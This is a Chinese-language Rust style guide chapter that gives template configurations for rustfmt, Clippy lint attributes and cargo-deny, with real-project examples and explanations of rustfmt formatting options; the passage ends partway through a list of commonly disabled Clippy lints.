<p>这里记录一些 rustfmt 和 clippy 等相关工具等配置文件模版。</p>
<ul>
<li><a href="safe-guides/Appendix/templates/./rustfmt.toml.html">rustfmt</a></li>
<li><a href="safe-guides/Appendix/templates/./clippy.toml.html">clippy</a></li>
<li><a href="safe-guides/Appendix/templates/./deny.toml.html">deny</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="rustfmt-模板"><a class="header" href="#rustfmt-模板">Rustfmt 模板</a></h1>
<p>为了方便 Rust 开发者，这里提供一个 Rustfmt 的模板，以供参考。</p>
<p>以下内容可以放到 <code>rustfmt.toml</code> 或 <code>.rustfmt.toml</code> 文件中。因为部分选项还未稳定，所以要使用 <code>cargo +nightly fmt</code> 执行。</p>
<p>很多选项都是默认的，无需配置。以下配置的都不是默认值。</p>
<p><strong>【只包含 Stable 的选项】</strong></p>
<pre><code class="language-toml"># 万一你要使用 rustfmt 2.0 就需要指定这个·
version = &quot;Two&quot;

# 统一管理宽度设置，但不包含 comment_width
use_small_heuristics=&quot;MAX&quot;
# 在match分支中，如果包含了块，也需要加逗号以示分隔
match_block_trailing_comma=true
# 当使用 extern 指定外部函数时，不需要显式指定 C-ABI ，默认就是 C-ABI
force_explicit_abi=false 
# 如果项目只在 Unix 平台下跑，可以设置该项为 Unix，表示换行符只依赖 Unix
newline_style=&quot;Unix&quot; 
# 不要将多个 Derive 宏合并为同一行
merge_derives = false

# 指定 fmt 忽略的目录
ignore = [
     &quot;src/test&quot;,
     &quot;test&quot;,
     &quot;docs&quot;,
]
</code></pre>
<p><strong>【也包含还未 Stable 的选项】</strong></p>
<p>未稳定，代表该选项还有一些 issue 没有解决，待解决以后就会稳定。</p>
<pre><code class="language-toml"># 万一你要使用 rustfmt 2.0 就需要指定这个·
version = &quot;Two&quot;

# 统一管理宽度设置，但不包含 comment_width
use_small_heuristics=&quot;MAX&quot;
# 使多个标识符定义保持对齐风格，代码看上去可以非常工整
indent_style=&quot;Visual&quot;  # 未稳定
# 设置让自定义具有判别式的枚举体按等号对齐的宽度
enum_discrim_align_threshold = 10  # 未稳定
# 在match分支中，如果包含了块，也需要加逗号以示分隔
match_block_trailing_comma=true
# 自动将同一个 crate 的模块导入合并到一起
imports_granularity=&quot;Crate&quot;  # 未稳定
# StdExternalCrate 导入模块分组规则
# 1. 导入来自 std、core 和 alloc 的模块需要置于前面一组。
# 2. 导入来自 第三方库的模块 应该置于中间一组。
# 3. 导入来自本地 self、super和crate前缀的模块，置于后面一组。
group_imports=&quot;StdExternalCrate&quot;  # 未稳定
# format_macro_matchers 规则说明：
# 声明宏 模式匹配分支（=&gt; 左侧）中要使用紧凑格式
# 默认声明宏分支代码体（=&gt; 右侧） 使用宽松格式
format_macro_matchers=true  # 未稳定
# 当使用 extern 指定外部函数时，不需要显式指定 C-ABI ，默认就是 C-ABI
force_explicit_abi=false 
# 指定一行注释允许的最大宽度
comment_width=100   # 未稳定
# wrap_comments 配合 comment_width 使用，自动将一行超过宽带限制的注释切分为多行注释
wrap_comments=true  # 未稳定
# 将 /**/ 注释转为 //
normalize_comments=true # 未稳定
# 元组模式匹配的时候允许使用 `..` 来匹配剩余元素
condense_wildcard_suffixes=true # 未稳定
# 如果项目只在 Unix 平台下跑，可以设置该项为 Unix，表示换行符只依赖 Unix
newline_style=&quot;Unix&quot; 
# 不要将多个 Derive 宏合并为同一行
merge_derives = false

# 指定 fmt 忽略的目录
ignore = [
     &quot;src/test&quot;,
     &quot;test&quot;,
     &quot;docs&quot;,
]
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="clippy-模板"><a class="header" href="#clippy-模板">Clippy 模板</a></h1>
<p>有些 Clippy 的 Lint，依赖于一些配置项，如果不想要默认值，可以在 <code>clippy.toml</code> 中进行设置。</p>
<pre><code class="language-toml"># for `disallowed_method`:
# https://rust-lang.github.io/rust-clippy/master/index.html#disallowed_method
disallowed-methods = []

# 函数参数最长不要超过5个
too-many-arguments-threshold=5
</code></pre>
<h2 id="clippy-lint-配置模板"><a class="header" href="#clippy-lint-配置模板">Clippy lint 配置模板</a></h2>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 参考： https://github.com/serde-rs/serde/blob/master/serde/src/lib.rs
#![allow(unknown_lints, bare_trait_objects, deprecated)]
#![cfg_attr(feature = &quot;cargo-clippy&quot;, allow(renamed_and_removed_lints))]
#![cfg_attr(feature = &quot;cargo-clippy&quot;, deny(clippy, clippy_pedantic))]
// Ignored clippy and clippy_pedantic lints
#![cfg_attr(
    feature = &quot;cargo-clippy&quot;,
    allow(
        // clippy bug: https://github.com/rust-lang/rust-clippy/issues/5704
        unnested_or_patterns,
        // clippy bug: https://github.com/rust-lang/rust-clippy/issues/7768
        semicolon_if_nothing_returned,
        // not available in our oldest supported compiler
        checked_conversions,
        empty_enum,
        redundant_field_names,
        redundant_static_lifetimes,
        // integer and float ser/de requires these sorts of casts
        cast_possible_truncation,
        cast_possible_wrap,
        cast_sign_loss,
        // things are often more readable this way
        cast_lossless,
        module_name_repetitions,
        option_if_let_else,
        single_match_else,
        type_complexity,
        use_self,
        zero_prefixed_literal,
        // correctly used
        enum_glob_use,
        let_underscore_drop,
        map_err_ignore,
        result_unit_err,
        wildcard_imports,
        // not practical
        needless_pass_by_value,
        similar_names,
        too_many_lines,
        // preference
        doc_markdown,
        unseparated_literal_suffix,
        // false positive
        needless_doctest_main,
        // noisy
        missing_errors_doc,
        must_use_candidate,
    )
)]
// Rustc lints.
#![deny(missing_docs, unused_imports)]
<span class="boring">}
</span></code></pre></pre>
<h2 id="embark-studios-的标准-lint-配置"><a class="header" href="#embark-studios-的标准-lint-配置">Embark Studios 的标准 Lint 配置</a></h2>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// BEGIN - Embark standard lints v5 for Rust 1.55+
// do not change or add/remove here, but one can add exceptions after this section
// for more info see: &lt;https://github.com/EmbarkStudios/rust-ecosystem/issues/59&gt;
#![deny(unsafe_code)]
#![warn(
    clippy::all,
    clippy::await_holding_lock,
    clippy::char_lit_as_u8,
    clippy::checked_conversions,
    clippy::dbg_macro,
    clippy::debug_assert_with_mut_call,
    clippy::disallowed_method,
    clippy::disallowed_type,
    clippy::doc_markdown,
    clippy::empty_enum,
    clippy::enum_glob_use,
    clippy::exit,
    clippy::expl_impl_clone_on_copy,
    clippy::explicit_deref_methods,
    clippy::explicit_into_iter_loop,
    clippy::fallible_impl_from,
    clippy::filter_map_next,
    clippy::flat_map_option,
    clippy::float_cmp_const,
    clippy::fn_params_excessive_bools,
    clippy::from_iter_instead_of_collect,
    clippy::if_let_mutex,
    clippy::implicit_clone,
    clippy::imprecise_flops,
    clippy::inefficient_to_string,
    clippy::invalid_upcast_comparisons,
    clippy::large_digit_groups,
    clippy::large_stack_arrays,
    clippy::large_types_passed_by_value,
    clippy::let_unit_value,
    clippy::linkedlist,
    clippy::lossy_float_literal,
    clippy::macro_use_imports,
    clippy::manual_ok_or,
    clippy::map_err_ignore,
    clippy::map_flatten,
    clippy::map_unwrap_or,
    clippy::match_on_vec_items,
    clippy::match_same_arms,
    clippy::match_wild_err_arm,
    clippy::match_wildcard_for_single_variants,
    clippy::mem_forget,
    clippy::mismatched_target_os,
    clippy::missing_enforced_import_renames,
    clippy::mut_mut,
    clippy::mutex_integer,
    clippy::needless_borrow,
    clippy::needless_continue,
    clippy::needless_for_each,
    clippy::option_option,
    clippy::path_buf_push_overwrite,
    clippy::ptr_as_ptr,
    clippy::rc_mutex,
    clippy::ref_option_ref,
    clippy::rest_pat_in_fully_bound_structs,
    clippy::same_functions_in_if_condition,
    clippy::semicolon_if_nothing_returned,
    clippy::single_match_else,
    clippy::string_add_assign,
    clippy::string_add,
    clippy::string_lit_as_bytes,
    clippy::string_to_string,
    clippy::todo,
    clippy::trait_duplication_in_bounds,
    clippy::unimplemented,
    clippy::unnested_or_patterns,
    clippy::unused_self,
    clippy::useless_transmute,
    clippy::verbose_file_reads,
    clippy::zero_sized_map_values,
    future_incompatible,
    nonstandard_style,
    rust_2018_idioms
)]
// END - Embark standard lints v0.5 for Rust 1.55+
// crate-specific exceptions:
#![allow()]

<span class="boring">}
</span></code></pre></pre>
<h2 id="clippy-配置的相关问题"><a class="header" href="#clippy-配置的相关问题">Clippy 配置的相关问题</a></h2>
<p>目前 Clippy 不支持配置文件来配置Lint ，目前 像 Embark 公司有两种解决方法：</p>
<ol>
<li>将 lint 放到一个<a href="https://github.com/EmbarkStudios/rust-ecosystem/blob/main/lints.rs">统一文件</a>中，然后复制粘贴到使用的地方。</li>
<li>通过 <code>.cargo/config.toml</code> 来配置 <code>rustflags</code>  ，参考： <a href="https://github.com/EmbarkStudios/rust-ecosystem/blob/main/lints.toml">lints.toml</a> </li>
</ol>
<p>Embark 也在跟踪和推动在 Cargo 中支持 Lint 配置的功能，相关 issues：</p>
<ul>
<li><a href="https://github.com/EmbarkStudios/rust-ecosystem/issues/22">Be able to disable/enable Clippy lints globally</a></li>
<li><a href="https://github.com/rust-lang/cargo/issues/5034">Support defining enabled and disabled lints in a configuration file</a></li>
<li><a href="https://github.com/rust-lang/rust-clippy/issues/6625">[Roadmap] Configuration file for lints</a></li>
</ul>
<h2 id="代码生成相关-clippy-配置"><a class="header" href="#代码生成相关-clippy-配置">代码生成相关 clippy 配置</a></h2>
<p>和 C 语言绑定代码生成，避免clippy 警告，相关配置可参考：</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// Generated by gir (https://github.com/gtk-rs/gir @ 5bbf6cb)
// from ../gir-files (@ 8e47c67)
// DO NOT EDIT

#![allow(non_camel_case_types, non_upper_case_globals, non_snake_case)]
#![allow(clippy::approx_constant, clippy::type_complexity, clippy::unreadable_literal, clippy::upper_case_acronyms)]
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="cargo-deny-配置模板"><a class="header" href="#cargo-deny-配置模板">Cargo Deny 配置模板</a></h1>
<p><a href="https://github.com/EmbarkStudios/cargo-deny">cargo-deny</a>  是检查 Cargo 依赖的一个 Lint 工具。它检查的范围包括：</p>
<ul>
<li>Licenses，检查依赖crate许可证是否合规。</li>
<li>Bans， 检查被禁止使用的依赖 crate。</li>
<li>Advisories ，检查有安全缺陷漏洞或停止维护的 依赖 crate。</li>
<li>Source，检查依赖crate 的来源，确保只来自于可信任的来源。</li>
</ul>
<p>以下是模板（参考 <a href="https://github.com/vectordotdev/vector/blob/master/deny.toml">vectordotdev/vector  的 deny.toml</a>）：</p>
<pre><code class="language-toml">[licenses]
allow = [
  &quot;MIT&quot;,
  &quot;CC0-1.0&quot;,
  &quot;ISC&quot;,
  &quot;OpenSSL&quot;,
  &quot;Unlicense&quot;,
  &quot;BSD-2-Clause&quot;,
  &quot;BSD-3-Clause&quot;,
  &quot;Apache-2.0&quot;,
  &quot;Apache-2.0 WITH LLVM-exception&quot;,
  &quot;Zlib&quot;,
]

unlicensed = &quot;warn&quot;
default = &quot;warn&quot;

private = { ignore = true }

[[licenses.clarify]]
name = &quot;ring&quot;
version = &quot;*&quot;
expression = &quot;MIT AND ISC AND OpenSSL&quot;
license-files = [
    { path = &quot;LICENSE&quot;, hash = 0xbd0eed23 }
]

[advisories]
ignore = [
    # term is looking for a new maintainer
    # https://github.com/timberio/vector/issues/6225
    &quot;RUSTSEC-2018-0015&quot;,

    # `net2` crate has been deprecated; use `socket2` instead
    # https://github.com/timberio/vector/issues/5582
    &quot;RUSTSEC-2020-0016&quot;,

    # Type confusion if __private_get_type_id__ is overriden
    # https://github.com/timberio/vector/issues/5583
    &quot;RUSTSEC-2020-0036&quot;,

    # stdweb is unmaintained
    # https://github.com/timberio/vector/issues/5585
    &quot;RUSTSEC-2020-0056&quot;,
]
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="e工具链"><a class="header" href="#e工具链">E.工具链</a></h1>
<p>这里介绍一些检测工具，比如 Cargo fmt 和 Cargo Clippy.</p>
<h2 id="参考资料"><a class="header" href="#参考资料">参考资料</a></h2>
<ol>
<li><a href="https://doc.rust-lang.org/rustc/lints/groups.html">https://doc.rust-lang.org/rustc/lints/groups.html</a></li>
<li><a href="https://rust-lang.github.io/rust-clippy/master/index.html">https://rust-lang.github.io/rust-clippy/master/index.html</a></li>
<li><a href="https://rust-lang.github.io/rust-clippy/master/index.html">https://rust-lang.github.io/rust-clippy/master/index.html</a></li>
<li><a href="https://github.com/dtolnay/noisy-clippy">Dtolnay 对 crates.io 中 clippy lint 应用统计</a></li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h1 id="rustfmt-配置相关说明"><a class="header" href="#rustfmt-配置相关说明">Rustfmt 配置相关说明</a></h1>
<h2 id="在-stable-rust-下使用未稳定配置项的方法"><a class="header" href="#在-stable-rust-下使用未稳定配置项的方法">在 Stable Rust 下使用未稳定配置项的方法</a></h2>
<ol>
<li>CI Job 可以分为 <code>Stable</code> 和 <code>Nightly</code>。在 <code>Stable CI</code> 下进行编译，在<code>Nightly CI</code>下执行<code>cargo fmt</code> 和 <code>cargo clippy</code>。</li>
<li>在项目本地可以使用 <code>cargo +nightly fmt</code> 代替 <code>cargo fmt</code>。</li>
</ol>
<p>注意： 一定要在文件保存之后再运行 rustfmt`，否则容易出错。</p>
<h2 id="真实项目中的配置案例"><a class="header" href="#真实项目中的配置案例">真实项目中的配置案例</a></h2>
<ol>
<li>来自 <a href="https://github.com/rust-lang/rust/blob/master/rustfmt.toml">Rust 语言自身项目</a>。</li>
</ol>
<pre><code class="language-toml"># Run rustfmt with this config (it should be picked up automatically).
version = &quot;Two&quot;
use_small_heuristics = &quot;Max&quot;
merge_derives = false

# by default we ignore everything in the repository
# tidy only checks files which are not ignored, each entry follows gitignore style
ignore = [
    &quot;/build/&quot;,
    &quot;/*-build/&quot;,
    &quot;/build-*/&quot;,
    &quot;/vendor/&quot;,

    # tests for now are not formatted, as they are sometimes pretty-printing constrained
    # (and generally rustfmt can move around comments in UI-testing incompatible ways)
    &quot;src/test&quot;,

    # do not format submodules
    &quot;library/backtrace&quot;,
    &quot;library/stdarch&quot;,
    &quot;compiler/rustc_codegen_cranelift&quot;,
    &quot;src/doc/book&quot;,
    &quot;src/doc/edition-guide&quot;,
    &quot;src/doc/embedded-book&quot;,
    &quot;src/doc/nomicon&quot;,
    &quot;src/doc/reference&quot;,
    &quot;src/doc/rust-by-example&quot;,
    &quot;src/doc/rustc-dev-guide&quot;,
    &quot;src/llvm-project&quot;,
    &quot;src/tools/cargo&quot;,
    &quot;src/tools/clippy&quot;,
    &quot;src/tools/miri&quot;,
    &quot;src/tools/rls&quot;,
    &quot;src/tools/rust-analyzer&quot;,
    &quot;src/tools/rustfmt&quot;,
    &quot;src/tools/rust-installer&quot;,
]

</code></pre>
<ol>
<li>来自 <a href="https://cs.opensource.google/fuchsia/fuchsia/+/main:rustfmt.toml">Google Fuchsia 操作系统</a>。</li>
</ol>
<pre><code class="language-toml"># Fuchsia Format Style
# last reviewed: Jan 29, 2019

# Fuchsia uses 2018 edition only
edition = &quot;2018&quot;

# The &quot;Default&quot; setting has a heuristic which splits lines too aggresively.
# We are willing to revisit this setting in future versions of rustfmt.
# Bugs:
#   * https://github.com/rust-lang/rustfmt/issues/3119
#   * https://github.com/rust-lang/rustfmt/issues/3120
use_small_heuristics = &quot;Max&quot;

# Prevent carriage returns
newline_style = &quot;Unix&quot;
</code></pre>
<ol start="2">
<li>来自 <a href="https://github.com/tikv/tikv/blob/master/rustfmt.toml">Tikv</a> 。</li>
</ol>
<pre><code class="language-toml">version = &quot;Two&quot;
unstable_features = true

condense_wildcard_suffixes = true
license_template_path = &quot;etc/license.template&quot;
newline_style = &quot;Unix&quot;
use_field_init_shorthand = true
use_try_shorthand = true
</code></pre>
<pre><code class="language-toml">
edition = &quot;2018&quot;
newline_style = &quot;unix&quot;
# comments
normalize_comments=true
wrap_comments=true
# imports 
imports_granularity=&quot;Crate&quot;
group_imports=&quot;StdExternalCrate&quot;

</code></pre>
<h2 id="一些全局配置项"><a class="header" href="#一些全局配置项">一些全局配置项</a></h2>
<h3 id="rustfml-格式化版本"><a class="header" href="#rustfml-格式化版本">rustfml 格式化版本</a></h3>
<p>【描述】</p>
<p><code>Version::One</code> 向后兼容 Rustfmt 1.0。 其他版本仅在主要版本号内向后兼容。目前 <code>version</code> 可选值只有 <code>One</code> 和 <code>Two</code>。</p>
<p>【对应配置项】</p>
<table><thead><tr><th>对应选项</th><th>可选值</th><th>是否 stable</th><th>说明</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#version"><code>version</code></a></td><td>One（默认）</td><td>No</td><td>指定 rustfmlt 格式化版本</td></tr>
</tbody></table>
<p>【示例】</p>
<pre><code class="language-toml"># Run rustfmt with this config (it should be picked up automatically).
version = &quot;Two&quot;
</code></pre>
<h3 id="指定文件或目录跳过格式化"><a class="header" href="#指定文件或目录跳过格式化">指定文件或目录跳过格式化</a></h3>
<p>【描述】</p>
<p>跳过与指定模式匹配的格式化文件和目录。 模式格式与 <code>.gitignore</code> 相同。 一定要使用 <code>Unix/forwardslash/style</code> 路径，此路径样式适用于所有平台。 不支持带有反斜杠 <code>\</code> 的 Windows 样式路径。</p>
<p>【对应配置项】</p>
<table><thead><tr><th>对应选项</th><th>可选值</th><th>是否 stable</th><th>说明</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#ignore"><code>ignore</code></a></td><td>格式化每一个Rust文件（默认）</td><td>No</td><td>指定文件或目录跳过格式化</td></tr>
</tbody></table>
<p>【示例】</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 跳过指定文件
ignore = [
    &quot;src/types.rs&quot;,
    &quot;src/foo/bar.rs&quot;,
]
// 跳过指定目录
ignore = [
    &quot;examples&quot;,
]
// 跳过项目内所有文件
ignore = [&quot;/&quot;]
<span class="boring">}
</span></code></pre></pre>
<h3 id="禁用格式化"><a class="header" href="#禁用格式化">禁用格式化</a></h3>
<p>【描述】</p>
<p>可以通过 <code>disable_all_formatting=true</code> 配置来禁用格式化。默认是开启的。</p>
<p>【对应配置项】</p>
<table><thead><tr><th>对应选项</th><th>可选值</th><th>是否 stable</th><th>说明</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#disable_all_formatting"><code>disable_all_formatting</code></a></td><td>false（默认）</td><td>No</td><td>禁止格式化</td></tr>
</tbody></table>
<h3 id="配置-edition-版次"><a class="header" href="#配置-edition-版次">配置 edition 版次</a></h3>
<p>【描述】</p>
<p>如果通过 Cargo 的格式化工具 cargo fmt 执行，Rustfmt 能够通过读取 Cargo.toml 文件来获取使用的版本。 否则，需要在配置文件中指定版本。</p>
<p>【对应配置项】</p>
<table><thead><tr><th>对应选项</th><th>可选值</th><th>是否 stable</th><th>说明</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#edition"><code>edition</code></a></td><td>2015（默认）</td><td>No</td><td>配置 edition 版次</td></tr>
</tbody></table>
<p>【示例】</p>
<pre><code class="language-toml">edition = &quot;2018&quot;
</code></pre>
<h3 id="开启未稳定特性"><a class="header" href="#开启未稳定特性">开启未稳定特性</a></h3>
<p>【描述】</p>
<p>默认未启用，但是可以通过配置此功能在 Nightly 上启用此功能。</p>
<p>【对应配置项】</p>
<table><thead><tr><th>对应选项</th><th>可选值</th><th>是否 stable</th><th>说明</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#unstable_features"><code>unstable_features</code></a></td><td>false（默认）</td><td>No</td><td>开启未稳定特性</td></tr>
</tbody></table>
<h2 id="每行最大宽度为-100-个字符"><a class="header" href="#每行最大宽度为-100-个字符">每行最大宽度为 100 个字符</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>代码行宽不宜过长，否则不利于阅读。
建议每行字符数不要超过 100 个字符。</p>
<p><code>rustfmt</code> 还提供很多其他宽度设置：</p>
<ul>
<li>fn_call_width, 函数调用最大宽度设置，其默认值是 <code>max_width</code>的 <code>60%</code>。</li>
<li>attr_fn_like_width, 像函数那样使用的属性宏最大宽度，其默认值是 <code>max_width</code>的 <code>70%</code>。</li>
<li>struct_lit_width,  结构体字面量最大宽度，其默认值是 <code>max_width</code>的 <code>18%</code>。</li>
<li>struct_variant_width, 结构体变量最大宽度，其默认值是 <code>max_width</code>的 <code>35%</code>。</li>
<li>array_width, 数组最大宽度，其默认值是 <code>max_width</code>的 <code>60%</code>。</li>
<li>chain_width, 链式结构最大宽度，其默认值是 <code>max_width</code>的 <code>60%</code>。</li>
<li>single_line_if_else_max_width，单行 <code>if-else</code> 最大宽度，其默认值是 <code>max_width</code>的 <code>50%</code>。</li>
</ul>
<p>这么多宽度设置管理起来比较麻烦，所以使用 <code>use_small_heuristics</code> 来管理更好。</p>
<p><strong>【反例】</strong></p>
<p>当<code>use_small_heuristics</code> 配置为 <code>Off</code> :</p>
<pre><pre class="playground"><code class="language-rust">enum Lorem {
    Ipsum,
    Dolor(bool),
    Sit {
        amet: Consectetur,
        adipiscing: Elit,
    },
}

fn main() {
    lorem(&quot;lorem&quot;, &quot;ipsum&quot;, &quot;dolor&quot;, &quot;sit&quot;, &quot;amet&quot;, &quot;consectetur&quot;, &quot;adipiscing&quot;);

    let lorem = Lorem {
        ipsum: dolor,
        sit: amet,
    };

    let lorem = if ipsum {
        dolor
    } else {
        sit
    };
}
</code></pre></pre>
<p>当<code>use_small_heuristics</code> 配置为 <code>Max</code> :</p>
<pre><pre class="playground"><code class="language-rust">enum Lorem {
    Ipsum,
    Dolor(bool),
    Sit { amet: Consectetur, adipiscing: Elit },
}

fn main() {
    lorem(&quot;lorem&quot;, &quot;ipsum&quot;, &quot;dolor&quot;, &quot;sit&quot;, &quot;amet&quot;, &quot;consectetur&quot;, &quot;adipiscing&quot;);

    let lorem = Lorem { ipsum: dolor, sit: amet };

    let lorem = if ipsum { dolor } else { sit };
}
</code></pre></pre>
<p><strong>【正例】</strong></p>
<p><code>use_small_heuristics</code> 默认配置示例。</p>
<pre><pre class="playground"><code class="language-rust">enum Lorem {
    Ipsum,
    Dolor(bool),
    Sit { amet: Consectetur, adipiscing: Elit },
}

fn main() {
    lorem(
        &quot;lorem&quot;,
        &quot;ipsum&quot;,
        &quot;dolor&quot;,
        &quot;sit&quot;,
        &quot;amet&quot;,
        &quot;consectetur&quot;,
        &quot;adipiscing&quot;,
    );

    let lorem = Lorem {
        ipsum: dolor,
        sit: amet,
    };
    let lorem = Lorem { ipsum: dolor };

    let lorem = if ipsum { dolor } else { sit };
}
</code></pre></pre>
<p><strong>【rustfmt 配置】</strong></p>
<p>此规则 Clippy 不可检测，由 rustfmt 自动格式化。</p>
<p>rustfmt 配置：</p>
<table><thead><tr><th>对应选项</th><th>可选值</th><th>是否 stable</th><th>说明</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#max_width"><code>max_width</code></a></td><td>100</td><td>yes（默认）</td><td>行最大宽度默认值</td></tr>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#error_on_line_overflow"><code>error_on_line_overflow</code></a></td><td>false（默认）</td><td>No (tracking issue: #3391)</td><td>如果超过最大行宽设置则报错</td></tr>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#use_small_heuristics"><code>use_small_heuristics</code></a></td><td>Default（默认）Max（推荐）</td><td>Yes</td><td>统一管理宽度设置</td></tr>
</tbody></table>
<h2 id="单行规则"><a class="header" href="#单行规则">单行规则</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>当语言项内容为空时，即空函数，空结构体，空实现等，要保持单独一行。但是，当函数中只有一个表达式时，请不要保持单行。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">fn lorem() {
}

impl Lorem {
}

fn lorem() -&gt; usize { 42 }

fn main() {
    let lorem = Lorem {
        foo: bar,
        baz: ofo,
    };
}
</code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">fn lorem() {}

impl Lorem {}

fn lorem() -&gt; usize {
    42
}

fn main() {
    let lorem = Lorem { foo: bar, baz: ofo };
}
</code></pre></pre>
<p><strong>【rustfmt 配置】</strong></p>
<p>此规则 Clippy 不可检测，由 rustfmt 自动格式化。</p>
<p>rustfmt 配置：</p>
<table><thead><tr><th>对应选项</th><th>默认值</th><th>是否 stable</th><th>说明</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#empty_item_single_line"><code>empty_item_single_line</code></a></td><td>true（默认）</td><td>No</td><td>当语言项内容为空时，要保持单行</td></tr>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#fn_single_line"><code>fn_single_line</code></a></td><td>false（默认）</td><td>No</td><td>当函数中只有一个表达式时，不要保持单行</td></tr>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#struct_lit_single_line"><code>struct_lit_single_line</code></a></td><td>true（默认）</td><td>No</td><td>当结构体字面量中只有少量表达式时，要保持单行</td></tr>
</tbody></table>
<h2 id="换行样式以文件自动检测为主"><a class="header" href="#换行样式以文件自动检测为主">换行样式以文件自动检测为主</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>换行样式是基于每个文件自动检测的。 具有混合行尾的文件将转换为第一个检测到的行尾样式。</p>
<p>不同平台换行符不同：</p>
<ul>
<li><code>Windows</code> 以 <code>\r\n</code>结尾。</li>
<li><code>Unix</code> 以 <code>\n</code> 结尾。</li>
</ul>
<p><strong>【rustfmt 配置】</strong></p>
<p>此规则 Clippy 不可检测，由 rustfmt 自动格式化。</p>
<p>rustfmt 配置：</p>
<table><thead><tr><th>对应选项</th><th>可选值</th><th>是否 stable</th><th>说明</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#newline_style"><code>newline_style</code></a></td><td>Auto（默认）</td><td>Yes</td><td>换行样式以文件自动检测为主</td></tr>
</tbody></table>
<h2 id="结尾逗号规则"><a class="header" href="#结尾逗号规则">结尾逗号规则</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<ol>
<li>当多个字段在不同行时，在最后一个字段结尾添加逗号，如果在同一行，则不加逗号。</li>
<li>在match分支中，如果包含了块，则不需要加逗号，否则需要加。</li>
</ol>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">// 当 `trailing_comma=&quot;Always&quot;`
fn main() {
    let Lorem { ipsum, dolor, sit, } = amet;
    let Lorem {
        ipsum,
        dolor,
        sit,
        amet,
        consectetur,
        adipiscing,
    } = elit;
}

// 当 `trailing_comma=&quot;Never&quot;`
fn main() {
    let Lorem { ipsum, dolor, sit } = amet;
    let Lorem {
        ipsum,
        dolor,
        sit,
        amet,
        consectetur,
        adipiscing
    } = elit;
}

// 当 `match_block_trailing_comma=true`
fn main() {
    match lorem {
        Lorem::Ipsum =&gt; {
            println!(&quot;ipsum&quot;);
        },
        Lorem::Dolor =&gt; println!(&quot;dolor&quot;),
    }
}
</code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">// 当 `trailing_comma=&quot;Vertical&quot;`
fn main() {
    let Lorem { ipsum, dolor, sit } = amet;
    let Lorem {
        ipsum,
        dolor,
        sit,
        amet,
        consectetur,
        adipiscing,
    } = elit;
}

// 当 `match_block_trailing_comma=false`
fn main() {
    match lorem {
        Lorem::Ipsum =&gt; {
            println!(&quot;ipsum&quot;);
        }
        Lorem::Dolor =&gt; println!(&quot;dolor&quot;),
    }
}
</code></pre></pre>
<p><strong>【rustfmt 配置】</strong></p>
<p>此规则 Clippy 不可检测，由 rustfmt 自动格式化。</p>
<p>rustfmt 配置：</p>
<table><thead><tr><th>对应选项</th><th>可选值</th><th>是否 stable</th><th>说明</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#trailing_comma"><code>trailing_comma</code></a></td><td>&quot;Vertical&quot;（默认）</td><td>No</td><td>当多个字段在不同行时，在最后一个字段结尾添加逗号，如果在同一行，则不加逗号</td></tr>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#match_block_trailing_comma"><code>match_block_trailing_comma</code></a></td><td>false（默认）</td><td>No</td><td>在match分支中，如果包含了块，则不需要加逗号，否则需要加</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h1 id="在-rust-生态中被拒绝的一些默认开启的lint"><a class="header" href="#在-rust-生态中被拒绝的一些默认开启的lint">在 Rust 生态中被拒绝的一些默认开启的lint</a></h1>
<p>来源：<a href="https://github.com/dtolnay/noisy-clippy">https://github.com/dtolnay/noisy-clippy</a></p>
<p>以下按字母顺序排列。</p>
<h2 id="absurd_extreme_comparisons"><a class="header" href="#absurd_extreme_comparisons"><code>absurd_extreme_comparisons</code></a></h2>
<p><a href="https://rust-lang.github.io/rust-clippy/master/index.html#absurd_extreme_comparisons">https://rust-lang.github.io/rust-clippy/master/index.html#absurd_extreme_comparisons</a></p>
<p>【描述】</p>
<p>默认为 <code>Deny</code>，但在实际应用中，多被设置为 <code>allow</code>。</p>
<h2 id="blacklisted_name"><a class="header" href="#blacklisted_name"><code>blacklisted_name</code></a></h2>
<p><a href="https://rust-lang.github.io/rust-clippy/master/index.html#blacklisted_name">https://rust-lang.github.io/rust-clippy/master/index.html#blacklisted_name</a></p>
<p>【描述】</p>
